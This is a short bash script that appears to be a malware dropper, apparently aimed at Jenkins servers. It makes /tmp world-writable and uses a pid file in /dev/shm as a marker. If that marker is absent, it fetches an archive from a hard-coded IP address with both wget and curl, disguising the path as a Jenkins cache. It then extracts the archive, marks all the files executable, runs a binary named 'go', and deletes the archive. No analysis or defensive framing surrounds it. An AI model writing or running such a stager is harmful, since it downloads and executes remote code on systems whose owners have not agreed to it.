#!/bin/bash

export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin

mkdir -p /tmp
chmod 1777 /tmp
cd /tmp

if [ ! -f "/dev/shm/j.pid" ]; then
	wget -q http://45.55.211.79/.cache/jenkins/stats.tar.gz
	curl -O http://45.55.211.79/.cache/jenkins/stats.tar.gz
	tar -zxvf stats.tar.gz
	rm -rf stats.tar.gz
	cd stats
	chmod +x *
	./go
fi

